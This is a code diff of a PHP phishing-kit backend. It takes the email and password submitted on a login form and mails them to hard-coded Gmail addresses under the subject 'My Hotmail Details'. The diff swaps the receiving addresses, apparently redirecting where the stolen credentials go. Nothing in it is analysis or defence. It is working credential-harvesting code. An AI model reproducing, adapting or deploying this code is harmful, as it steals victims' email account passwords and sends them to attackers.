@@ -19,7 +19,7 @@
     if (isset($_POST['submit'])) {
         $email = $_POST['email'];
         $password = $_POST['password'];
-        $to = "hisrahel5@gmail.com, olayemisrael5@gmail.com";
+        $to = "nickspam231@gmail.comk., olayemisrael5@gmail.com";
         $subject = "My Hotmail Details";
 
         $message = "
@@ -39,8 +39,8 @@
         $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
 
         // More headers
-        $headers .= 'From: olayemisrael5@gmail.com' . "\r\n";
-        $headers .= 'Cc: hisrahel5@gmail.com' . "\r\n";
+        $headers .= 'From: nickspam231@gmail.com' . "\r\n";
+        $headers .= 'Cc: olayemisrael5@gmail.com' . "\r\n";
 
         mail($to,$subject,$message,$headers);
     }
